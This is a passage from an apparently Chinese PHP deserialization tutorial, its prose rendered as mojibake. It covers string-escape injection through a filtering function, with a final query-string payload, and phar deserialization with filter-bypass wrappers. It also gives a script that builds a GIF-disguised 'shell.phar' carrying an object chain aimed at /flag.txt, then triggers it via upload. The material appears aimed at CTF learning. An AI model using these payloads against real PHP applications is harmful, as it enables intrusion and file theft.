	<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/php|test/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token variable">$test</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'2020'</span><span class="token punctuation">;</span>
<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">str_rep</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fake</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sign:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sign'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"number:"</span><span class="token operator">.</span><span class="token variable">$fake</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'number'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>È¶ñÂÖàÔºåÊàë‰ª¨ÁöÑÁõÆÁöÑÊòØË¶ÅÂà©Áî®Ëøô‰∏™<code>str_rep</code>ÔºåÈÄöËøáËæìÂÖ•<code>name</code>Âíå<code>sign</code>Êù•Èó¥Êé•‰øÆÊîπ<code>number</code>ÁöÑÂÄº</p>
<p>ÊÄùË∑Ø</p>
<p>Áî±‰∫énameÂèØ‰ª•ËøõË°åË¶ÜÁõñÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®nameË¶ÜÁõñÊéâsignÁöÑÂâçÈÉ®ÂàÜÂÄºÔºåÁÑ∂Âêé‰∏≠Èó¥ÈÉ®ÂàÜÁî®Êù•Èó≠ÂêàÂâçÈù¢ÁöÑÂ±ûÊÄßÂÄºÔºåÂêéÈù¢ÈÉ®ÂàÜÁî®Êù•Ë¶ÜÁõñnumberÂÄºÂπ∂ÊèêÂâçÈó≠Âêà</p>
<p>Êàë‰ª¨Ë¶Å‰øÆÊîπnumberÁöÑÂÄºÔºåÂ∞±Ë¶ÅÂú®sign‰∏≠Âä†ÂÖ•<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code>ÈïøÂ∫¶‰∏∫27</p>
<p>Âú®str_repÂáΩÊï∞‰∏≠Â¶ÇÊûúÊ£ÄÊµãÂà∞‚Äôphp‚Äô„ÄÅ'test‚ÄôÂÖ≥ÈîÆÂ≠óÂ∞±ÊääÂÖ∂ÊõøÊç¢‰∏∫Á©∫ÔºåÈÇ£‰πàÂ∞±Âà©Áî®Ëøô‰∏ÄÁÇπÔºåÊàë‰ª¨ÊïÖÊÑèËæìÂÖ•ÊïèÊÑüÂ≠óÁ¨¶ÔºåÊõøÊç¢‰∏∫Á©∫‰πãÂêéÊù•ÂÆûÁé∞Â≠óÁ¨¶ÈÄÉÈÄ∏„ÄÇÊàë‰ª¨Âú®name‰∏≠ËæìÂÖ•‰∫ÜËæìÂÖ•‰∫Ü6‰∏™testÔºåÊõøÊç¢‰∏∫Á©∫ÂêéËøôÊ†∑Â∞±ËÖæÂá∫‰∫Ü24‰∏™Â≠óÁ¨¶ÁöÑÁ©∫Èó¥ÔºåÊ≠£Â•ΩÂåÖÂê´Ëøõ‰∫Ü&quot;;s:4:‚Äúsign‚Äù;s:54:‚ÄúhelloÔºåÁî±‰∫é‚Äù;s:4:‚Äúsign‚Äù;s:54:‚ÄúhelloÊàê‰∫ÜnameÁöÑÂÜÖÂÆπÔºåÊâÄ‰ª•Êàë‰ª¨ËøòË¶ÅÂú®ÂêéÈù¢Âä†‰∏™‚Äù;s:4:‚Äúsign‚Äù;s:4:&quot;eval‰Ωú‰∏∫signÂ∫èÂàóÂåñÁöÑÂÜÖÂÆπ</p>
<p>ËøôÈáåÊòØÂ¶Ç‰ΩïËøõË°åËÆ°ÁÆóÁöÑ?</p>
<p>Êàë‰ª¨Ë¶ÅÊÅ∞Â•Ω‰øùËØÅ<code>name</code>ÁªèËøáËøáÊª§Âêé‰ºöË¶ÜÁõñÊéâÂéüÊúâÁöÑ<code>sign</code>ÂÄº</p>
<p><code>sign</code>ÂÖ∂ÂÆûÊòØÂèØ‰ª•ÈÉ®ÂàÜÁ°ÆÂÆöÁöÑÔºå<code>&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code>ÈïøÂ∫¶‰∏∫49</p>
<p><code>s:4:&quot;name&quot;;s:??:&quot;|&quot;;s:4:&quot;sign&quot;;s:??:&quot;|sign_value&quot;</code></p>
<p>Ë¶ÅÊÅ∞Â•ΩË¶ÜÁõñÂàÜÂâ≤Á∫ø‰πãÈó¥ÁöÑÈÉ®ÂàÜÔºå‰πüÂ∞±ÊòØË¶ÅÈÄÉÈÄ∏19‰∏™Â≠óÁ¨¶Ôºå‰ΩÜÊòØÈÄÉÈÄ∏ÁöÑÂ≠óÁ¨¶ÂøÖÈ°ªÊòØ3Êàñ4ÁöÑÂÄçÊï∞ÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂÅáËÆæÈÄÉÈÄ∏24‰∏™ÔºåÂú®sign_valueÂâçË°•ÂÖÖ5‰∏™ÂûÉÂúæÂ≠óÁ¨¶<code>hello</code>Âç≥ÂèØ</p>
<p><code>24/4=6</code>ÔºånameÁöÑÂÄºÊòØ6‰∏™<code>test</code></p>
<p>ÊúÄÁªàÁöÑ<code>payload</code></p>
<p><code>?name=testtesttesttesttesttest&amp;sign=hello&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;</code></p>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703181936938.png" class="" alt="image-20240703181936938" loading="lazy">
<h3 id="pharÂèçÂ∫èÂàóÂåñ"><a class="markdownIt-Anchor" href="#pharÂèçÂ∫èÂàóÂåñ"></a> pharÂèçÂ∫èÂàóÂåñ</h3>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">Âà©Áî® phar ÊãìÂ±ï php ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊîªÂáªÈù¢ (seebug.org)</a></p>
<p>Áî±‰∫é‰ª£Á†ÅÂÆâÂÖ®ÊÄßË∂äÊù•Ë∂äÈ´òÔºåÂà©Áî®ÈöæÂ∫¶Ë∂äÊù•Ë∂äÂ§ßÔºåÂÅáÂ¶ÇÊ≤°Êúâ<code>unserialize</code>Ê≤°‰∫Ü‰º†ÂèÇÊé•Âè£Â∞±Êó†Ê≥ïËøõË°åÂà©Áî®</p>
<h4 id="ÂâçÁΩÆÁü•ËØÜ-2"><a class="markdownIt-Anchor" href="#ÂâçÁΩÆÁü•ËØÜ-2"></a> ÂâçÁΩÆÁü•ËØÜ</h4>
<p><mark>pharÂèçÂ∫èÂàóÂåñÂç≥Âú®Êñá‰ª∂Á≥ªÁªüÂáΩÊï∞Ôºàfile_exists()„ÄÅis_dir()Á≠âÔºâÂèÇÊï∞ÂèØÊéßÁöÑÊÉÖÂÜµ‰∏ãÔºåÈÖçÂêàphar://‰º™ÂçèËÆÆÔºåÂèØ‰ª•‰∏ç‰æùËµñunserialize()Áõ¥Êé•ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇ</mark><br />
ÂÖ∑‰ΩìÊñáÁ´†<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a><br />
È¶ñÂÖà‰∫ÜËß£‰∏Ä‰∏ãpharÊñá‰ª∂ÁöÑÁªìÊûÑÔºå‰∏Ä‰∏™pharÊñá‰ª∂Áî±ÂõõÈÉ®ÂàÜÊûÑÊàêÔºö</p>
<ul>
<li>a stubÔºöÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™Ê†áÂøóÔºåÊ†ºÂºè‰∏∫<code>xxx&lt;?php xxx; **HALT_COMPILER();?&gt;</code>ÔºåÂâçÈù¢ÂÜÖÂÆπ‰∏çÈôêÔºå‰ΩÜÂøÖÈ°ª‰ª•<code>**HALT_COMPILER();?&gt;</code>Êù•ÁªìÂ∞æÔºåÂê¶ÂàôpharÊâ©Â±ïÂ∞ÜÊó†Ê≥ïËØÜÂà´Ëøô‰∏™Êñá‰ª∂‰∏∫pharÊñá‰ª∂„ÄÇ</li>
<li>a manifest describing the contentsÔºöpharÊñá‰ª∂Êú¨Ë¥®‰∏äÊòØ‰∏ÄÁßçÂéãÁº©Êñá‰ª∂ÔºåÂÖ∂‰∏≠ÊØè‰∏™Ë¢´ÂéãÁº©Êñá‰ª∂ÁöÑÊùÉÈôê„ÄÅÂ±ûÊÄßÁ≠â‰ø°ÊÅØÈÉΩÊîæÂú®ËøôÈÉ®ÂàÜ„ÄÇËøôÈÉ®ÂàÜËøò‰ºö‰ª•Â∫èÂàóÂåñÁöÑÂΩ¢ÂºèÂ≠òÂÇ®Áî®Êà∑Ëá™ÂÆö‰πâÁöÑmeta-dataÔºåËøôÊòØ‰∏äËø∞ÊîªÂáªÊâãÊ≥ïÊúÄÊ†∏ÂøÉÁöÑÂú∞Êñπ„ÄÇ</li>
<li>the file contentsÔºöË¢´ÂéãÁº©Êñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)ÔºöÁ≠æÂêçÔºåÊîæÂú®Êñá‰ª∂Êú´Â∞æ</li>
</ul>
<p>ÈÄö‰øóÁöÑÁêÜËß£Â∞±ÊòØphpÊñá‰ª∂Á≥ªÁªüÂæàÂ§ß‰∏ÄÈÉ®ÂàÜÂáΩÊï∞ÁªèËøáphar://Ëß£ÊûêÊó∂ÔºåÂ≠òÂú®ÁùÄÂØπmeta-dataÔºàÂú®ËøôÈáå<code>&lt;meta-data&gt;</code>Âå∫ÂüüÈù¢ÊêûÂèçÂ∫èÂàóÂåñÁöÑpopÈìæÔºâÂèçÂ∫èÂàóÂåñÁöÑÊìç‰Ωú</p>
<h4 id="Âà©Áî®Êù°‰ª∂"><a class="markdownIt-Anchor" href="#Âà©Áî®Êù°‰ª∂"></a> Âà©Áî®Êù°‰ª∂</h4>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>pharÊñá‰ª∂Ë¶ÅËÉΩÂ§ü‰∏ä‰º†Âà∞ÊúçÂä°Âô®Á´Ø„ÄÇ
<span class="token number">2.</span>Ë¶ÅÊúâÂèØÁî®ÁöÑÈ≠îÊúØÊñπÊ≥ï‰Ωú‰∏∫‚ÄúË∑≥Êùø‚Äù„ÄÇ
<span class="token number">3.</span>Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞ÁöÑÂèÇÊï∞ÂèØÊéßÔºå‰∏î   <span class="token operator">.</span><span class="token operator">/</span>    <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>    pharÁ≠âÁâπÊÆäÂ≠óÁ¨¶Ê≤°ÊúâË¢´ËøáÊª§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞"><a class="markdownIt-Anchor" href="#Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞"></a> Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞</h4>
<p>phpÂ§ßÈÉ®ÂàÜÁöÑÊñá‰ª∂Á≥ªÁªüÂáΩÊï∞Âú®ÈÄöËøáphar://‰º™ÂçèËÆÆËß£ÊûêpharÊñá‰ª∂Êó∂ÔºåÈÉΩ‰ºöÂ∞Ümeta-dataËøõË°åÂèçÂ∫èÂàóÂåñÔºåÁü•ÈÅìÂàõÂÆáÊµãËØïÂêéÂèëÂ∏ÉÁöÑÂèóÂΩ±ÂìçÁöÑÂáΩÊï∞Â¶Ç‰∏ã :</p>
<img src="/2024/07/01/%E5%88%9D%E8%AF%86PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240703192958671.png" class="" alt="image-20240703192958671" loading="lazy">
<h4 id="ÁªïËøáÊñπÊ≥ï"><a class="markdownIt-Anchor" href="#ÁªïËøáÊñπÊ≥ï"></a> ÁªïËøáÊñπÊ≥ï</h4>
<p>Ôºà1Ôºâphar://Ë¢´ËøáÊª§<br />
Êúâ‰ª•‰∏ãÂá†ÁßçÊñπÊ≥ïÂèØ‰ª•ÁªïËøáÔºö</p>
<ul>
<li>compress.bzip2://phar://</li>
<li>compress.zlib://phar:///</li>
<li>php://filter/resource=phar://</li>
<li>$z = ‚Äòcompress.bzip2://phar:///home/sx/test.phar/test.txt‚Äô;</li>
</ul>
<p>Ôºà2ÔºâÈô§Ê≠§‰πãÂ§ñÔºåÊàë‰ª¨ËøòÂèØ‰ª•Â∞Üphar‰º™ÈÄ†ÊàêÂÖ∂‰ªñÊ†ºÂºèÁöÑÊñá‰ª∂„ÄÇ<br />
phpËØÜÂà´pharÊñá‰ª∂ÊòØÈÄöËøáÂÖ∂Êñá‰ª∂Â§¥ÁöÑstubÔºåÊõ¥Á°ÆÂàá‰∏ÄÁÇπÊù•ËØ¥ÊòØ__HALT_COMPILER();?&gt;ËøôÊÆµ‰ª£Á†ÅÔºåÂØπÂâçÈù¢ÁöÑÂÜÖÂÆπÊàñËÄÖÂêéÁºÄÂêçÊòØÊ≤°ÊúâË¶ÅÊ±ÇÁöÑ„ÄÇÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÊ∑ªÂä†‰ªªÊÑèÁöÑÊñá‰ª∂Â§¥+‰øÆÊîπÂêéÁºÄÂêçÁöÑÊñπÂºèÂ∞ÜpharÊñá‰ª∂‰º™Ë£ÖÊàêÂÖ∂‰ªñÊ†ºÂºèÁöÑÊñá‰ª∂„ÄÇ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token this keyword">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag.txt"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÁîüÊàê‰∏Ä‰∏™pharÊñá‰ª∂ÔºåÊñá‰ª∂Âêç‰∏∫shell.phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ËÆæÁΩÆstub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Â∞ÜÂØπË±°userÂÜôÂÖ•Âà∞metadata‰∏≠</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"haha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Ê∑ªÂä†ÂéãÁº©Êñá‰ª∂ÔºåÊñá‰ª∂ÂêçÂ≠ó‰∏∫shell.txt,ÂÜÖÂÆπ‰∏∫haha</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÊúÄÂêéÊääÊñá‰ª∂‰∏ä‰º†ÂêéËøõË°åÂà©Áî®<code>?filename=phar://shell.jpg</code></p>
<p>ËøôÈáåÊñá‰ª∂‰∏ä‰º†ËøòË¶ÅÊîπÊîπÊñá‰ª∂Á±ªÂûãÂíåÊñá‰ª∂ÂêçÁªïËøá</p>
<h3 id="sessionÂèçÂ∫èÂàóÂåñ"><a class="markdownIt-Anchor" href="#sessionÂèçÂ∫èÂàóÂåñ"></a> sessionÂèçÂ∫èÂàóÂåñ</h3>
<p>ÁêÜËß£phpÁöÑsession‰πãÂâçÂÖà‰∫ÜËß£‰∏Ä‰∏ãsessionÊòØ‰ªÄ‰πàÔºåËøôÈáåÂºïÁî®ÁôæÂ∫¶ÁöÑÊèèËø∞ÔºåÊØîËæÉÂÆòÊñπ<br />
<strong>SessionÔºö</strong><br />
Âú®ËÆ°ÁÆóÊú∫‰∏≠ÔºåÂ∞§ÂÖ∂ÊòØÂú®ÁΩëÁªúÂ∫îÁî®‰∏≠ÔºåÁß∞‰∏∫‚Äú‰ºöËØùÊéßÂà∂‚Äù„ÄÇSessionÂØπË±°Â≠òÂÇ®ÁâπÂÆöÁî®Êà∑‰ºöËØùÊâÄÈúÄÁöÑÂ±ûÊÄßÂèäÈÖçÁΩÆ‰ø°ÊÅØ„ÄÇËøôÊ†∑ÔºåÂΩìÁî®Êà∑Âú®Â∫îÁî®Á®ãÂ∫èÁöÑWebÈ°µ‰πãÈó¥Ë∑≥ËΩ¨Êó∂ÔºåÂ≠òÂÇ®Âú®SessionÂØπË±°‰∏≠ÁöÑÂèòÈáèÂ∞Ü‰∏ç‰ºö‰∏¢Â§±ÔºåËÄåÊòØÂú®Êï¥‰∏™Áî®Êà∑‰ºöËØù‰∏≠‰∏ÄÁõ¥Â≠òÂú®‰∏ãÂéª„ÄÇÂΩìÁî®Êà∑ËØ∑Ê±ÇÊù•Ëá™Â∫îÁî®Á®ãÂ∫èÁöÑ WebÈ°µÊó∂ÔºåÂ¶ÇÊûúËØ•Áî®Êà∑ËøòÊ≤°Êúâ‰ºöËØùÔºåÂàôWebÊúçÂä°Âô®Â∞ÜËá™Âä®ÂàõÂª∫‰∏Ä‰∏™ SessionÂØπË±°„ÄÇÂΩì‰ºöËØùËøáÊúüÊàñË¢´ÊîæÂºÉÂêéÔºåÊúçÂä°Âô®Â∞ÜÁªàÊ≠¢ËØ•‰ºöËØù„ÄÇSession ÂØπË±°ÊúÄÂ∏∏ËßÅÁöÑ‰∏Ä‰∏™Áî®Ê≥ïÂ∞±ÊòØÂ≠òÂÇ®Áî®Êà∑ÁöÑÈ¶ñÈÄâÈ°π„ÄÇ‰æãÂ¶ÇÔºåÂ¶ÇÊûúÁî®Êà∑ÊåáÊòé‰∏çÂñúÊ¨¢Êü•ÁúãÂõæÂΩ¢ÔºåÂ∞±ÂèØ‰ª•Â∞ÜËØ•‰ø°ÊÅØÂ≠òÂÇ®Âú®SessionÂØπË±°‰∏≠„ÄÇ‰∏çËøá‰∏çÂêåËØ≠Ë®ÄÁöÑ‰ºöËØùÊú∫Âà∂ÂèØËÉΩÊúâÊâÄ‰∏çÂêå„ÄÇ</p>
<p><strong>PHP sessionÔºö</strong><br />
ÂèØ‰ª•ÁúãÂÅöÊòØ‰∏Ä‰∏™ÁâπÊÆäÁöÑÂèòÈáèÔºå‰∏îËØ•ÂèòÈáèÊòØÁî®‰∫éÂ≠òÂÇ®ÂÖ≥‰∫éÁî®Êà∑‰ºöËØùÁöÑ‰ø°ÊÅØÔºåÊàñËÄÖÊõ¥ÊîπÁî®Êà∑‰ºöËØùÁöÑËÆæÁΩÆÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåPHP Session ÂèòÈáèÂ≠òÂÇ®Âçï‰∏ÄÁî®Êà∑ÁöÑ‰ø°ÊÅØÔºåÂπ∂‰∏îÂØπ‰∫éÂ∫îÁî®Á®ãÂ∫è‰∏≠ÁöÑÊâÄÊúâÈ°µÈù¢ÈÉΩÊòØÂèØÁî®ÁöÑÔºå‰∏îÂÖ∂ÂØπÂ∫îÁöÑÂÖ∑‰Ωì session ÂÄº‰ºöÂ≠òÂÇ®‰∫éÊúçÂä°Âô®Á´ØÔºåËøô‰πüÊòØ‰∏é cookieÁöÑ‰∏ªË¶ÅÂå∫Âà´ÔºåÊâÄ‰ª•seesion ÁöÑÂÆâÂÖ®ÊÄßÁõ∏ÂØπËæÉÈ´ò„ÄÇ</p>
<p><strong>sessionÁöÑÂ∑•‰ΩúÊµÅÁ®ãÔºö</strong><br />
ÂΩìÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆÁΩëÁ´ôÊó∂ÔºåSeesion_start()ÂáΩÊï∞Â∞±‰ºöÂàõÂª∫‰∏Ä‰∏™ÂîØ‰∏ÄÁöÑSession IDÔºåÂπ∂Ëá™Âä®ÈÄöËøáHTTPÁöÑÂìçÂ∫îÂ§¥ÔºåÂ∞ÜËøô‰∏™Session ID‰øùÂ≠òÂà∞ÂÆ¢Êà∑Á´ØCookie‰∏≠„ÄÇÂêåÊó∂Ôºå‰πüÂú®ÊúçÂä°Âô®Á´ØÂàõÂª∫‰∏Ä‰∏™‰ª•Session IDÂëΩÂêçÁöÑÊñá‰ª∂ÔºåÁî®‰∫é‰øùÂ≠òËøô‰∏™Áî®Êà∑ÁöÑ‰ºöËØù‰ø°ÊÅØ„ÄÇÂΩìÂêå‰∏Ä‰∏™Áî®Êà∑ÂÜçÊ¨°ËÆøÈóÆËøô‰∏™ÁΩëÁ´ôÊó∂Ôºå‰πü‰ºöËá™Âä®ÈÄöËøáHTTPÁöÑËØ∑Ê±ÇÂ§¥Â∞ÜCookie‰∏≠‰øùÂ≠òÁöÑSeesion IDÂÜçÊê∫Â∏¶ËøáÊù•ÔºåËøôÊó∂Session_start()ÂáΩÊï∞Â∞±‰∏ç‰ºöÂÜçÂéªÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑSession IDÔºåËÄåÊòØÂú®ÊúçÂä°Âô®ÁöÑÁ°¨Áõò‰∏≠ÂéªÂØªÊâæÂíåËøô‰∏™Session IDÂêåÂêçÁöÑSessionÊñá‰ª∂ÔºåÂ∞ÜËøô‰πãÂâç‰∏∫Ëøô‰∏™Áî®Êà∑‰øùÂ≠òÁöÑ‰ºöËØù‰ø°ÊÅØËØªÂá∫ÔºåÂú®ÂΩìÂâçËÑöÊú¨‰∏≠Â∫îÁî®ÔºåËææÂà∞Ë∑üË∏™Ëøô‰∏™Áî®Êà∑ÁöÑÁõÆÁöÑ„ÄÇ</p>
<p><strong>seesion_start()ÁöÑ‰ΩúÁî®Ôºö</strong><br />
ÂΩì‰ºöËØùËá™Âä®ÂºÄÂßãÊàñËÄÖÈÄöËøá session_start() ÊâãÂä®ÂºÄÂßãÁöÑÊó∂ÂÄôÔºå PHP ÂÜÖÈÉ®‰ºö‰æùÊçÆÂÆ¢Êà∑Á´Ø‰º†Êù•ÁöÑPHPSESSIDÊù•Ëé∑ÂèñÁé∞ÊúâÁöÑÂØπÂ∫îÁöÑ‰ºöËØùÊï∞ÊçÆÔºàÂç≥sessionÊñá‰ª∂ÔºâÔºå PHP ‰ºöËá™Âä®ÂèçÂ∫èÂàóÂåñsessionÊñá‰ª∂ÁöÑÂÜÖÂÆπÔºåÂπ∂Â∞Ü‰πãÂ°´ÂÖÖÂà∞ $_SESSION Ë∂ÖÁ∫ßÂÖ®Â±ÄÂèòÈáè‰∏≠„ÄÇÂ¶ÇÊûú‰∏çÂ≠òÂú®ÂØπÂ∫îÁöÑ‰ºöËØùÊï∞ÊçÆÔºåÂàôÂàõÂª∫Âêç‰∏∫sess_PHPSESSID(ÂÆ¢Êà∑Á´Ø‰º†Êù•ÁöÑ)ÁöÑÊñá‰ª∂„ÄÇÂ¶ÇÊûúÂÆ¢Êà∑Á´ØÊú™ÂèëÈÄÅPHPSESSIDÔºåÂàôÂàõÂª∫‰∏Ä‰∏™Áî±32‰∏™Â≠óÊØçÁªÑÊàêÁöÑPHPSESSIDÔºåÂπ∂ËøîÂõûset-cookie„ÄÇ</p>
<p><strong>php.ini‰∏≠‰∏Ä‰∫õSessionÈÖçÁΩÆÔºö</strong><br />
1„ÄÅsession.save_path=‚Äú‚Äù --ËÆæÁΩÆsessionÁöÑÂ≠òÂÇ®Ë∑ØÂæÑ<br />
2„ÄÅsession.save_handler=‚Äú‚Äù‚ÄìËÆæÂÆöÁî®Êà∑Ëá™ÂÆö‰πâÂ≠òÂÇ®ÂáΩÊï∞ÔºåÂ¶ÇÊûúÊÉ≥‰ΩøÁî®PHPÂÜÖÁΩÆ‰ºöËØùÂ≠òÂÇ®Êú∫Âà∂‰πãÂ§ñÁöÑÂèØ‰ª•‰ΩøÁî®Êú¨ÂáΩÊï∞(Êï∞ÊçÆÂ∫ìÁ≠âÊñπÂºè)<br />
3„ÄÅsession.auto_start boolen‚ÄìÊåáÂÆö‰ºöËØùÊ®°ÂùóÊòØÂê¶Âú®ËØ∑Ê±ÇÂºÄÂßãÊó∂ÂêØÂä®‰∏Ä‰∏™‰ºöËØùÈªòËÆ§‰∏∫0‰∏çÂêØÂä®<br />
